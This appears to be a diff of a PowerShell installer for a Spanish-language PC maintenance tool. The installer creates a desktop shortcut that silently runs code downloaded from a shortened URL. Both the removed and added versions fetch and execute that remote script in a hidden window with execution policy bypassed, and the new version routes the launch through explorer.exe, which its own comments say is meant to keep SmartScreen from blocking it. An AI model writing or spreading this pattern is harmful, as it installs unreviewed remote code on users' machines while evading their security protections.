@@ -11,21 +11,12 @@ if (Test-Path $ShortcutPath) { Remove-Item $ShortcutPath -Force }
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
 
-# Creamos un script cargador local en AppData para que Windows no bloquee el acceso directo
-$appFolder = Join-Path $env:APPDATA "AntonyDapier"
-if (-not (Test-Path $appFolder)) { New-Item -ItemType Directory -Path $appFolder -Force | Out-Null }
-$loaderPath = Join-Path $appFolder "mantenimiento_v10.ps1"
-'iex (irm https://bit.ly/mandia-windows)' | Set-Content -Path $loaderPath -Force
+# Usamos explorer.exe como puente (Proxy) para evitar que SmartScreen bloquee el acceso directo
+$Shortcut.TargetPath = "explorer.exe"
+$Shortcut.Arguments = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (irm https://bit.ly/mandia-windows)"""
 
-# El acceso directo ahora apunta a un archivo local, lo cual evita el bloqueo de seguridad
-$Shortcut.TargetPath = "$PSHOME\powershell.exe"
-$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$loaderPath"""
-
-$Shortcut.IconLocation = "shell32.dll,70" # Icono de sistema para mantenimiento
+$Shortcut.IconLocation = "imageres.dll,109" # Icono moderno de herramientas
 $Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
 $Shortcut.Save()
 
-Unblock-File -Path $ShortcutPath -ErrorAction SilentlyContinue
-Unblock-File -Path $loaderPath -ErrorAction SilentlyContinue
-
-[System.Windows.MessageBox]::Show("¡Instalación completada con éxito!`n`nSe ha creado el acceso directo en tu escritorio. Al abrirlo, el sistema cargará tu herramienta y solicitará permisos de administrador.", "Antony Dapier - Mantenimiento", "OK", "Information")
+[System.Windows.MessageBox]::Show("¡Instalación completada!`n`nSe ha creado el acceso directo 'Optimizar PC - Antony Dapier' en tu escritorio. Ya puedes usar la herramienta.", "Antony Dapier - Mantenimiento", "OK", "Information")
